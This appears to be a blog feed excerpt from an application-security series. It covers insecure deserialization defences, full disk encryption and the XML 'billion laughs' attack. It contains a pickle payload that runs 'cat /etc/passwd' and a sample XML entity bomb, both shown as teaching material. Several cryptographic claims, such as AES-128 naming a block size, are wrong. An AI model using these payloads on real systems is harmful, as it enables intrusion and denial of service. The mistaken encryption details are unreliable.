&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pickle&lt;/span&gt;

&lt;span class="n"&gt;pickle&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;"cos&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;system&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;(S'cat /etc/passwd'&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;tR."&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id="how-can-i-defend-against-deserialization-attacks_1"&gt;How can I defend against deserialization attacks?&lt;/h2&gt;
&lt;p&gt;Two measures you can almost always do:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Principle of least privilege&lt;/strong&gt;: Run your code with as few privileges as
  possible. You do for sure not need root privileges. Depending on your level
  of paranoia, you could create a specialized user which only does the
  deserialization. You could remove the right to use the network from that
  user.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Defense in Depth&lt;/strong&gt;: Make sure every component takes possible security
  measures.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For some formats, you can tell the deserializer to ignore some of its features:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;PyYAML&lt;/strong&gt;: Use the yaml.safe_load function. At some point, they changed the
  interface so that yaml.load points to yaml.safe_load . You can still use
  yaml.unsafe_load . I love that they included &amp;ldquo;unsafe&amp;rdquo; in the function call.
  This makes it obvious that something might be dangerous.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;XML&lt;/strong&gt;: For Python, there is
  &lt;a href="https://pypi.org/project/defusedxml"&gt;defusedxml&lt;/a&gt; which sets various XML
  parsers of Python to safe defaults, preventing
  &lt;a href="https://medium.com/faun/xxe-attacks-750e91448e8f"&gt;XEE&lt;/a&gt;, the billion laughs
  attack, and quadratic blowup.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For other formats like pickle, you just have to be sure that your input does not cause harm.&lt;/p&gt;
&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers üòà and also techniques of the defenders üòá:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) üòá&lt;/li&gt;
&lt;li&gt;Part 9: &lt;a href="https://medium.com/faun/xxe-attacks-750e91448e8f"&gt;XXE attacks&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 10: &lt;a href="https://levelup.gitconnected.com/effective-access-control-331f883cb0ff"&gt;Effective Access Control&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 11: &lt;a href="https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139"&gt;DOS via a Billion Laughs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 12: &lt;a href="https://medium.com/faun/full-disk-encryption-2090489f9760"&gt;Full Disk Encryption&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 13: &lt;a href="https://medium.com/bugbountywriteup/insecure-deserialization-5c64e9943f0e"&gt;Insecure Deserialization&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 14: &lt;a href="https://levelup.gitconnected.com/docker-security-5f4df118948c"&gt;Docker Security&lt;/a&gt; üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And this is about to come:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CSRF üòà&lt;/li&gt;
&lt;li&gt;DOS üòà&lt;/li&gt;
&lt;li&gt;ReDoS üòà&lt;/li&gt;
&lt;li&gt;Credential Stuffing üòà&lt;/li&gt;
&lt;li&gt;Cryptojacking üòà&lt;/li&gt;
&lt;li&gt;Single-Sign-On üòá&lt;/li&gt;
&lt;li&gt;Two-Factor Authentication üòá&lt;/li&gt;
&lt;li&gt;Backups üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="AppSec"></category><category term="Cybersecurity"></category></entry><entry><title>Full Disk Encryption üòá</title><link href="https://martin-thoma.com/https://medium.com/faun/full-disk-encryption-2090489f9760" rel="alternate"></link><published>2020-12-28T20:00:00+01:00</published><updated>2020-12-28T20:00:00+01:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-12-28:/https://medium.com/faun/full-disk-encryption-2090489f9760</id><summary type="html">&lt;p&gt;Having an attacker with physical access to your device is one of the worst
scenarios. If the data is not encrypted on the disk, then the attacker can
simply disassemble your device, get the HDD/SDD, put it in his machine, and
read the data. For this reason, encrypting your ‚Ä¶&lt;/p&gt;</summary><content type="html">&lt;p&gt;Having an attacker with physical access to your device is one of the worst
scenarios. If the data is not encrypted on the disk, then the attacker can
simply disassemble your device, get the HDD/SDD, put it in his machine, and
read the data. For this reason, encrypting your data is crucial.&lt;/p&gt;
&lt;p&gt;There are so many things you want to protect that it makes sense to just
encrypt the complete hard drive. For example, you might have valuable data on
your swap partition or within temporary files. So just encrypt the whole drive.
This is called &lt;strong&gt;F&lt;/strong&gt;ull &lt;strong&gt;D&lt;/strong&gt;isk &lt;strong&gt;E&lt;/strong&gt;ncryption, or &lt;strong&gt;FDE&lt;/strong&gt; in short. Let&amp;rsquo;s
talk about how it works, different implementations of it, and the weaknesses.&lt;/p&gt;
&lt;h2 id="why-it-matters"&gt;Why it Matters&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;2009&lt;/strong&gt;: According to &amp;ldquo;The Cost of a Lost Laptop&amp;rdquo; by Ponemon Institute, the
  average damage organizations suffer due to lost laptops is &lt;strong&gt;$49,246&lt;/strong&gt;.
  Please note that this includes the hardware, the damage done by leaked
  confidential data, and the damage done by lost work.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2015&lt;/strong&gt;: &amp;ldquo;Nearly 41% of all data breach events from 2005 through 2015 were
  caused by lost devices such as laptops, tablets, and smartphones.&amp;rdquo;
  (&lt;a href="https://www.forbes.com/sites/steveolenski/2017/12/08/is-the-data-on-your-business-digital-devices-safe/?sh=22fc1c014c6a"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="fde-does-not-solve"&gt;FDE does not solve&amp;hellip;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&amp;hellip; lost data: You need to make backups for that&lt;/li&gt;
&lt;li&gt;&amp;hellip; leaking data through memory: FDE is about protecting data at rest. When
  your computer is turned off. Not about protecting data in memory or in
  transit. &lt;a href="undefined"&gt;Subash SN&lt;/a&gt; shows this beautifully in his article
  &lt;a href="https://blog.appsecco.com/breaking-full-disk-encryption-from-a-memory-dump-5a868c4fc81e"&gt;Breaking Full Disk Encryption from a Memory
  Dump&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&amp;hellip; leaking data through the internet: If an attacker gets live access to your
  computer, e.g. by convincing you to install some software to make a remote
  fix on your machine (phishing), FDE does not help at all.&lt;/li&gt;
&lt;li&gt;&amp;hellip; &lt;a href="https://en.wikipedia.org/wiki/Rubber-hose_cryptanalysis"&gt;rubber-hose
  cryptanalysis&lt;/a&gt;:
  Torturing you to give your password away.&lt;/li&gt;
&lt;li&gt;&amp;hellip; &lt;a href="https://en.wikipedia.org/wiki/Keystroke_logging"&gt;hardware keyloggers&lt;/a&gt;: If
  the attacker can record all your keystrokes, they will also get the password
  you&amp;rsquo;re using to decrypt the drive.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="how-fde-works"&gt;How FDE Works&lt;/h2&gt;
&lt;p&gt;Full disk encryption (FDE) works on a very low level. It is below the file
system which also means it&amp;rsquo;s compatible with every file system. It uses a
symmetric encryption algorithm that operates on blocks of data, e.g. 128-bit.
Those blocks are automatically encrypted when they are written and
automatically decrypted when they are requested. The program typically keeps
the key in memory.&lt;/p&gt;
&lt;p&gt;A typical choice is a &lt;strong&gt;block size of 128-bit&lt;/strong&gt;, the &lt;strong&gt;AES block cipher&lt;/strong&gt; with
a &lt;strong&gt;256-bit key &lt;/strong&gt;and&lt;strong&gt; CBC operation mode&lt;/strong&gt;. Block ciphers operate on blocks
of an exact size (e.g. 128-bit). They get this size as input and give the same
size in output. The operation mode &amp;mdash; or short &amp;ldquo;mode&amp;rdquo; &amp;mdash; is the rule that is
applied to deal with other block sizes. The simplest mode is ECB
(&lt;strong&gt;e&lt;/strong&gt;lectronic &lt;strong&gt;c&lt;/strong&gt;ode&lt;strong&gt;b&lt;/strong&gt;ook). That mode just splits the plain text into
blocks of the desired size, pads the last message with zeros, and applies the
cipher to every block independently. This is a bad idea as it shows repeating
patterns clearly. XTS is a common mode explained by &lt;a href="undefined"&gt;Prof Bill Buchanan
OBE&lt;/a&gt; in his article &lt;a href="https://medium.com/asecuritysite-when-bob-met-alice/who-needs-a-tweak-meet-full-disk-encryption-437e720879ac"&gt;Who Needs a Tweak? Meet Full Disk
Encryption&lt;/a&gt;.
Computerphile has a nice explanation of the modes:&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;iframe allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/Rk0NIQfEXBA" width="560"&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/p&gt;
&lt;p&gt;The key has to be stored on the device to encrypt the data. This means the key
needs to be secure. Additionally, one may not store the key in plaintext on the
machine and one needs to prevent brute-forcing of the key. What the user
memorizes is the passphrase. This passphrase is run through a cryptographic
hash function to generate the key. This &amp;ldquo;cryptographic&amp;rdquo; means that it is
computationally heavy &amp;mdash; you have to spend that computation every time you
unlock your computer. But the attacker also has to do it. Meaning if you need
e.g. 1 second to run this, the attacker would need one second for every single
attempt. A typical &lt;strong&gt;key derivation function&lt;/strong&gt; is &lt;strong&gt;PBKDF2&lt;/strong&gt; and a typical
&lt;strong&gt;cryptographic hash function&lt;/strong&gt; is &lt;strong&gt;SHA-512&lt;/strong&gt;. After the key has been derived,
it is stored securely in memory.&lt;/p&gt;
&lt;p&gt;Instead of using a password, you could also give your users a physical token
such as a Yubikey
(&lt;a href="https://www.yubico.com/works-with-yubikey/catalog/secure-disk-for-bitlocker/"&gt;example&lt;/a&gt;)
or similar solutions. Or you simply put the key file on a USB stick. The
advantage of such tokens is that users cannot give them away. But this is a
topic for another article.&lt;/p&gt;
&lt;p&gt;All of that is not worth anything if you have a keylogger running. Hardware
keyloggers need extra considerations, but for software keyloggers, we want to
ensure the integrity of the boot path. This is where TPM can help. TPM is a
piece of hardware that ensures that no tampering happened to the hardware or
essential parts of the software, namely the BIOS&lt;/p&gt;
&lt;h2 id="what-is-secure"&gt;What is Secure?&lt;/h2&gt;
&lt;p&gt;NIST is the US national institute of standards and technology. Their
recommendations are widely followed. The German BSI is also interesting to look
at.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://tsapps.nist.gov/publication/get_pdf.cfm?pub_id=904691"&gt;NIST 800&amp;ndash;38E&lt;/a&gt;
(2010) approves the XTS-AES mode with either 256-bit keys (XTS-AES-128; 128 is
the block size here) or &lt;strong&gt;512-bit keys&lt;/strong&gt; for a &lt;strong&gt;256-bit block size&lt;/strong&gt; using the
&lt;strong&gt;AES cipher&lt;/strong&gt; in &lt;strong&gt;XTS mode&lt;/strong&gt;. Please note that AES-128 refers to a block size
of 128-bit, not to the length of the key.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Publikationen/TechnischeRichtlinien/TR02102/BSI-TR-02102.pdf?__blob=publicationFile"&gt;BSI
TR-02102&amp;ndash;1&lt;/a&gt;
(2020) recommends using one of those block-ciphers: AES-128, AES-192, AES-256.
They say CCM, GCM, CBC, CTR are acceptable. Interestingly, they do not mention
XTS here. In another part of the document, they mention potential issues of
this mode for backups.&lt;/p&gt;
&lt;h2 id="fde-solutions"&gt;FDE Solutions&lt;/h2&gt;
&lt;h3 id="windows-bitlocker"&gt;Windows: BitLocker&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/BitLocker"&gt;BitLocker&lt;/a&gt; is an FDE feature included
with Microsoft Windows since 2007. By default, it uses AES in CBC mode with a
128-bit key. It can be configured to use XTS mode and/or a 256-bit key. It can
use a &lt;a href="https://en.wikipedia.org/wiki/Trusted_Platform_Module"&gt;TPM&lt;/a&gt; to validate
the integrity of boot and system files before decrypting a protected volume.&lt;/p&gt;
&lt;p&gt;Here is a guide on how to set BitLocker up on Windows: &lt;a href="https://www.windowscentral.com/how-use-bitlocker-encryption-windows-10"&gt;&lt;strong&gt;Setting up BitLocker
Drive Encryption on Windows 10&lt;/strong&gt; &lt;em&gt;When you store sensitive data on your
computer, it's crucial that you take the necessary steps to protect that
data&amp;hellip;&lt;/em&gt;www.windowscentral.com&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="linux-dm-crypt-using-luks2"&gt;Linux: dm-crypt using LUKS2&lt;/h3&gt;
&lt;p&gt;dm-crypt using LUKS is the default way to do FDE on Linux since 2004. dm-crypt
supports XTS, but the default cipher string specification is
aes-cbc-essiv:sha256
(&lt;a href="http://manpages.ubuntu.com/manpages/bionic/man8/cryptsetup.8.html"&gt;source&lt;/a&gt;).
You can use cryptsetup and cryptmount to manage your dm-crypt .&lt;/p&gt;
&lt;p&gt;You can use GRUBs cryptodisk feature to secure your boot path.&lt;/p&gt;
&lt;p&gt;Detailed instructions can be found here:
&lt;a href="https://help.ubuntu.com/community/Full_Disk_Encryption_Howto_2019"&gt;&lt;strong&gt;Full_Disk_Encryption_Howto_2019&lt;/strong&gt;
&lt;em&gt;Further support may be available from Freenode IRC channel #ubuntu. This page is an up-to-date guide to comprehensive&amp;hellip;&lt;/em&gt;help.ubuntu.com&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="mac-filevault-2"&gt;Mac: FileVault 2&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/FileVault"&gt;FileVault&lt;/a&gt; is the FDE program that was introduced for Mac in 2003. By default, it uses XTS-AES with 128-bit blocks and a 256-bit key.&lt;/p&gt;
&lt;p&gt;Here is a guide on how to turn on FileVault on Mac:
&lt;a href="https://support.apple.com/en-us/HT204837"&gt;&lt;strong&gt;Use FileVault to encrypt the startup disk on your Mac&lt;/strong&gt;
&lt;em&gt;FileVault 2 is available in OS X Lion or later. When FileVault is turned on, your Mac always requires that you log in&amp;hellip;&lt;/em&gt;support.apple.com&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="android"&gt;Android&lt;/h3&gt;
&lt;p&gt;Only Android 7.0 to 9 support FDE. Android 10 only supports file-based
encryption
(&lt;a href="https://source.android.com/security/encryption/full-disk"&gt;source&lt;/a&gt;). Some
speculations why the FDE was removed are issues with alarm clocks and support
options in case of forgotten passwords
(&lt;a href="https://www.reddit.com/r/Android/comments/gt3ib8/why_was_fulldisk_encryption_removeddisallowed_in/"&gt;source&lt;/a&gt;).
As a phone is typically running all the time and rather easy to unlock, disk
encryption is actually not enough. The memory needs to be protected as well.&lt;/p&gt;
&lt;p&gt;The supported Android versions used dm-crypt .&lt;/p&gt;
&lt;p&gt;In my Samsung S10, the setting to enable FDE on Android is called &amp;ldquo;Strong Protection&amp;rdquo;. You find a guide here:
&lt;a href="https://www.androidauthority.com/how-to-encrypt-android-device-326700/"&gt;&lt;strong&gt;How to encrypt your Android device&lt;/strong&gt;
&lt;em&gt;There's little doubt that keeping your personal data secure these days is pretty important, so it is fortunate that&amp;hellip;&lt;/em&gt;www.androidauthority.com&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="honorable-mentions"&gt;Honorable Mentions&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;GnuPG (Linux) is a free replacement for PGP released in 1999. It received 250k DM in 1995 which would be equivalent to 350k &amp;euro; or $427k USD in 2019.&lt;/li&gt;
&lt;li&gt;PGP (Linux): Pretty Good Privacy (PGP) from Symantec (now NortonLifeLock) calls the concept &lt;strong&gt;W&lt;/strong&gt;hole &lt;strong&gt;D&lt;/strong&gt;isk &lt;strong&gt;E&lt;/strong&gt;ncryption (&lt;strong&gt;WDE&lt;/strong&gt;) instead of FDE. WDE was introduced in 2014 to PGP. It uses a password as authentication before the rest of the operating system can boot. This means you can use it for Windows and Linux.&lt;/li&gt;
&lt;li&gt;VeraCrypt (former TrueCrypt): If you&amp;rsquo;re interested in how to use it, have a look at &lt;a href="undefined"&gt;Andrew Douma&lt;/a&gt;s article &lt;a href="https://medium.com/@securitystreak/veracrypt-full-disk-drive-encryption-fde-157eacbf0b61"&gt;Full Disk Encryption with VeraCrypt&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="lost-device-policy_1"&gt;Lost Device Policy&lt;/h2&gt;
&lt;p&gt;Having FDE on all your devices is not enough. On the one hand, you need to make
sure that the employees use strong passwords and that those passwords are not
written on the device.&lt;/p&gt;
&lt;p&gt;But even that should not be it. You should have a documented way how to handle
lost devices. You need a Lost Device Policy. This can include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Block all accounts of that employee. Even if the laptop gets compromised, at least the remaining accounts cannot be used to steal more data.&lt;/li&gt;
&lt;li&gt;Try to get the laptop again by calling lost&amp;amp;found stations (e.g. for the taxi/airport/hotel)&lt;/li&gt;
&lt;li&gt;Inform the police that the laptop was stolen. You should have a model name and the serial number at hand. Maybe even something that makes the laptop unique?&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="see-also"&gt;See also&lt;/h2&gt;
&lt;p&gt;While searching for references for this article, I came across some very good resources.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ArchLinux: &lt;a href="https://wiki.archlinux.org/index.php/Data-at-rest_encryption"&gt;Data-at-rest encryption&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;ArchLinux: &lt;a href="https://wiki.archlinux.org/index.php/Dm-crypt/Encrypting_an_entire_system"&gt;dmcrypt/Encrypting an entire system&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Security.SE: &lt;a href="https://security.stackexchange.com/questions/39306/how-secure-is-ubuntus-default-full-disk-encryption"&gt;How secure is Ubuntu&amp;rsquo;s default full-disk encryption?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers üòà and also techniques of the defenders üòá:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) üòá&lt;/li&gt;
&lt;li&gt;Part 9: &lt;a href="https://medium.com/faun/xxe-attacks-750e91448e8f"&gt;XXE attacks&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 10: &lt;a href="https://levelup.gitconnected.com/effective-access-control-331f883cb0ff"&gt;Effective Access Control&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 11: &lt;a href="https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139"&gt;DOS via a Billion Laughs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 12: &lt;a href="https://medium.com/faun/full-disk-encryption-2090489f9760"&gt;Full Disk Encryption&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 13: &lt;a href="https://medium.com/bugbountywriteup/insecure-deserialization-5c64e9943f0e"&gt;Insecure Deserialization&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 14: &lt;a href="https://levelup.gitconnected.com/docker-security-5f4df118948c"&gt;Docker Security&lt;/a&gt; üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And this is about to come:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CSRF üòà&lt;/li&gt;
&lt;li&gt;DOS üòà&lt;/li&gt;
&lt;li&gt;ReDoS üòà&lt;/li&gt;
&lt;li&gt;Credential Stuffing üòà&lt;/li&gt;
&lt;li&gt;Cryptojacking üòà&lt;/li&gt;
&lt;li&gt;Single-Sign-On üòá&lt;/li&gt;
&lt;li&gt;Two-Factor Authentication üòá&lt;/li&gt;
&lt;li&gt;Backups üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="Security"></category><category term="Cybersecurity"></category><category term="IT Security"></category><category term="InfoSec"></category></entry><entry><title>DOS via a billion laughs üòà</title><link href="https://martin-thoma.com/https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139" rel="alternate"></link><published>2020-12-23T20:00:00+01:00</published><updated>2020-12-23T20:00:00+01:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-12-23:/https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139</id><summary type="html">&lt;p&gt;&lt;img alt="Image by the author" src="https://cdn-images-1.medium.com/max/3708/1*Mlli4bOg_zK6Jbllje6bFQ.png"/&gt;&lt;em&gt;Image by the author&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The billion laughs attack is known since 2003 (&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1564"&gt;source&lt;/a&gt;). The attack uses the references in XML files to make a small source file be huge in memory if all references are expanded. It&amp;rsquo;s also known as a LOL bomb, XML bomb, or in a variation ‚Ä¶&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;img alt="Image by the author" src="https://cdn-images-1.medium.com/max/3708/1*Mlli4bOg_zK6Jbllje6bFQ.png"/&gt;&lt;em&gt;Image by the author&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The billion laughs attack is known since 2003 (&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1564"&gt;source&lt;/a&gt;). The attack uses the references in XML files to make a small source file be huge in memory if all references are expanded. It&amp;rsquo;s also known as a LOL bomb, XML bomb, or in a variation as a YAML bomb and git bomb. It is a type of denial of service (DOS) attack as it can bring a service down.&lt;/p&gt;
&lt;h2 id="why-you-should-care"&gt;Why you should care&lt;/h2&gt;
&lt;p&gt;This is a bit too specific to be visible in many news articles. However, there are several big projects which were vulnerable over the years:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2003: libxml2 was vulnerable (&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1564"&gt;CVE-2003&amp;ndash;1564&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;2015: MediaWiki was vulnerable (&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2942"&gt;CVE-2015&amp;ndash;2942&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;2016: &lt;a href="https://en.wikipedia.org/wiki/Libxml2"&gt;libxml2&lt;/a&gt; was vulnerable &amp;hellip; again (&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3705"&gt;CVE-2016&amp;ndash;3705&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;2016: HTTP/2 header compression was used to build an HPACK bomb (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2016-6581"&gt;CVE-2016&amp;ndash;6581&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;2019: Kubernetes was vulnerable (&lt;a href="https://github.com/kubernetes/kubernetes/issues/83253"&gt;source&lt;/a&gt;, &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11253"&gt;CVE-2019&amp;ndash;11253&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;2019: &lt;a href="https://www.mchange.com/projects/c3p0/"&gt;c3p0&lt;/a&gt; (JDBC database drivers) was vulnerable (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2019-5427"&gt;CVE-2019&amp;ndash;5427&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="how-it-works"&gt;How it works&lt;/h2&gt;
&lt;p&gt;The following XML defines an entity laugh , then an entity ha2 which contains laugh twice. This pattern is repeated. This means ha5 contains laugh indirectly 16 times. You can see the exponential growth, can&amp;rsquo;t you?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?xml version="1.0"?&amp;gt;&lt;/span&gt;

&lt;span class="cp"&gt;&amp;lt;!DOCTYPE root [&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;!ENTITY laugh "üòÜ"&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;!ENTITY ha2 "&amp;amp;ha; &amp;amp;ha;"&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;!ENTITY ha3 "&amp;amp;ha2; &amp;amp;ha2;"&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;!ENTITY ha4 "&amp;amp;ha3; &amp;amp;ha3;"&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;!ENTITY ha5 "&amp;amp;ha4; &amp;amp;ha4;"&amp;gt;&lt;/span&gt;
]&amp;gt;

&lt;span class="nt"&gt;&amp;lt;root&amp;gt;&lt;/span&gt;&lt;span class="ni"&gt;&amp;amp;ha5;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;With ha31, we would have 2&amp;sup3;‚Å∞ times üòÜ . That is a billion laughs. Please note how asymmetric this is: With a document that is less than 1kB big the attacker can make the parser consume about Gigabytes of memory. This can easily consume all memory of a machine and thus render it unusable until the parser is killed or the machine is restarted.&lt;/p&gt;
&lt;p&gt;A slight variation of the &lt;strong&gt;billion laughs attack&lt;/strong&gt; is called &lt;strong&gt;quadratic blowup&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Please notice that similar attacks are possible in other file formats such as YAML. The key point here is that those formats have references.&lt;/p&gt;
&lt;h2 id="how-can-i-defend-against-a-billion-laughs"&gt;How can I defend against a billion laughs?&lt;/h2&gt;
&lt;p&gt;Assuming that you cannot control the input directly and prevent XMLs with attacks from reaching you at all, I can think of 4 measures:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Lazy evaluation of references&lt;/strong&gt;: Instead of evaluating the whole document at once, the references are only resolved when necessary. It might solve some issues.&lt;/li&gt;
